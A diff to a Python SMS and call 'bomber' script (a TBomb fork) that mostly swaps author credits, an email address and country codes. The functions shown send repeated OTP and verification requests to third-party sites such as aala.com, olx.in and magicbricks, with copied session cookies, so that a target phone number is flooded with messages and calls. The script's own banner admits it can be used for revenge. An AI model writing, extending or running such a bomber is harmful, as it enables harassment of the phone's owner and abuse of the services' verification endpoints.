@@ -20,7 +20,7 @@ except ImportError:
 
 colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
 W='\033[0m'
-# The Credit For This Code Goes To SpeedX And All Other Contributors Listed At https://github.com/Thepride1-h/TBomb
+# The Credit For This Code Goes To SpeedX And All Other Contributors Listed At https://github.com/TheSpeedX/TBomb
 # If You Wanna Take Credits For This Code, Please Look Yourself Again
 
 country_codes = {
@@ -265,7 +265,7 @@ def infinite(pn, dl, ch, max):
         os.system('touch proc.xxx')
         api = random.choice(ch)
         try:
-            ret = getapi(pn, api, 977)
+            ret = getapi(pn, api, 91)
         except Exception:
             ret = False
         if not ret:
@@ -274,7 +274,7 @@ def infinite(pn, dl, ch, max):
             continue
         os.system('rm proc.xxx >/dev/null 2>&1')
         count_inf += 1
-        # os.system('echo pride1-h>> count.xxx')
+        # os.system('echo SpeedX >> count.xxx')
         time.sleep(float(dl))
         if (count_inf > maxlim):
             exit()
@@ -367,7 +367,7 @@ def getapi(pn, lim, cc):
         rd = hashlib.md5(open('temp.xxx2', 'rb').read()).hexdigest()
         return rd == '24f467b24087ff48c96321786d89c69f'
     elif lim == 15:
-        rd = os.popen('curl -s -X POST -H "Host:www.aala.com" -H "Connection:keep-alive" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://www.aala.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.aala.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:frontend=a27mn3h3irt1rlt6i55s93p9r5; frontend_cid=8zqBBzwQTMIt9UKg; _BEAMER_USER_ID_gADrycBn12870=c9fe4f7d-b421-4bad-9cf2-0a4db716dff4; G_ENABLED_IDPS=google" -d \'email=' + cc + pn + '&firstname=pride1-h&lastname=pride1-h\' "https://www.aala.com/accustomer/ajax/getOTP"').read().strip()
+        rd = os.popen('curl -s -X POST -H "Host:www.aala.com" -H "Connection:keep-alive" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://www.aala.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.aala.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:frontend=a27mn3h3irt1rlt6i55s93p9r5; frontend_cid=8zqBBzwQTMIt9UKg; _BEAMER_USER_ID_gADrycBn12870=c9fe4f7d-b421-4bad-9cf2-0a4db716dff4; G_ENABLED_IDPS=google" -d \'email=' + cc + pn + '&firstname=SpeedX&lastname=SpeedX\' "https://www.aala.com/accustomer/ajax/getOTP"').read().strip()
         return rd.find('code:') != -1
     elif lim == 16:
         os.popen('curl -s -X POST -d \'method=SMS&countryCode=id&phoneNumber=' + cc + pn +
@@ -386,7 +386,7 @@ def getapi(pn, lim, cc):
         return rd.lower().find("y") != -1
     elif lim == 103:
         os.system(
-            'curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H "cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H "cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \'{"type":"call","descriptor":"+977' + pn + '"}\' "https://www.olx.in/api/challenges" >/dev/null 2>&1')
+            'curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H "cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H "cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \'{"type":"call","descriptor":"+91' + pn + '"}\' "https://www.olx.in/api/challenges" >/dev/null 2>&1')
         return True
     elif lim == 104:
         rd = os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '"').read().decode('utf-8')
@@ -436,7 +436,7 @@ def start(target, counter, delay, ch, cc):
                 else:
                     print('\n\n\tSorry Your Country is Not Supported...')
                     print(
-                        '\t\tPlease Send A Mail To ggpride1-h29@gmail.com To Let Us Know...')
+                        '\t\tPlease Send A Mail To ggspeedx29@gmail.com To Let Us Know...')
                     input('Press Enter To Exit...')
                     exit()
         print(random.choice(colors))
@@ -450,7 +450,7 @@ def start(target, counter, delay, ch, cc):
         print("             Failed Requests         : ", failed)
         print("==================================================================")
         print("              Use this for fun, not for revenge !!                ")
-        print("              This Bomber Was Created By pride1-h !!                ")
+        print("              This Bomber Was Created By Pride1-h !!                ")
         print("==================================================================")
         try:
             result = getapi(target, api, cc)
@@ -619,7 +619,7 @@ if nm == 0:
     print("             Delay               : ", dl)
     print("==================================================================")
     print("              Use this for fun, not for revenge !!                ")
-    print("              This Bomber Was Created By pride !!                ")
+    print("              This Bomber Was Created By Pride1-h !!                ")
     print("==================================================================")
     print(W)
     input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
@@ -638,7 +638,7 @@ if nm == 0:
         if int(l) > maxlim:
             print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
                   str(maxlim) + ' SMS At Once...\n\n')
-             input('Press Enter To Exit...')
+            input('Press Enter To Exit...')
             os.system('rm *xxx* > /dev/null 2>&1')
             banner()
             exit()
